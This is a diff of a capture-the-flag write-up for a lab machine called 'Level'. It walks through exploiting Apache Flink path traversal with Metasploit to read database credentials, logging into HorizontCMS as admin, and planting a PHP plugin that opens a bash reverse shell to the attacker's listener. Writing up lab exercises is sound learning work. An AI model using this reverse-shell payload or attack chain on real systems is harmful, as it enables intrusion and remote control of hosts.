@@ -1,6 +1,7 @@
 # Level
 
 ```
+# nmap -sCV -p- level.htb
 Nmap scan report for level.htb (10.129.95.161)
 Host is up (0.40s latency).
 Not shown: 995 closed ports
@@ -9,7 +10,7 @@ PORT     STATE SERVICE          VERSION
 8081/tcp open  blackice-icecap?
 ```
 
-Apache Flink on port 8081 is vulnerable to path traversal. Metasploit has a module for it. We can read the .env file at the webroot:
+Apache Flink on port 8081 is vulnerable to path traversal. Metasploit has a module for it. We can read the .env file in the webroot:
 ```
 msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > run
 
@@ -20,7 +21,7 @@ msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > run
 [*] Auxiliary module execution completed
 
 
-Tue Jul 27 01:28:42 wil@pwn:~/htb/business_ctf/boxes/level$ cat /home/wil/.msf4/loot/20210727012858_default_10.129.173.192_apache.flink.job_666566.txt                                                              
+$ cat /home/wil/.msf4/loot/20210727012858_default_10.129.173.192_apache.flink.job_666566.txt                                                              
 DB_HOST=127.0.0.1
 DB_CONNECTION=mysql
 DB_USERNAME=hcms
@@ -36,7 +37,7 @@ These credentials are valid on port 80 on HorizontCMS:
 With admin privileges we can add a malicous plugin, here we used a modified [GoogleMaps](https://github.com/ttimot24/GoogleMaps) plugin with a reverse shell: 
 
 ```bash
-Tue Jul 27 01:34:52 wil@pwn:~/htb/business_ctf/boxes/level/plugin/GoogleMaps/resources/lang/en$ cat messages.php 
+$ cat messages.php 
 <?php 
 
 $shell = exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/9000 0>&1'");
@@ -52,7 +53,7 @@ Install and activate it
 Click on `Google Maps (top menu) / Add location` / Set arbitrary content in fields then save.
 
 ```bash
-Tue Jul 27 01:36:41 wil@pwn:~/htb/business_ctf/boxes/level$ nc -nvlp 9000
+$ nc -nvlp 9000
 Listening on [0.0.0.0] (family 2, port 9000)
 Connection from 10.129.173.192 60640 received!
 bash: cannot set terminal process group (1038): Inappropriate ioctl for device
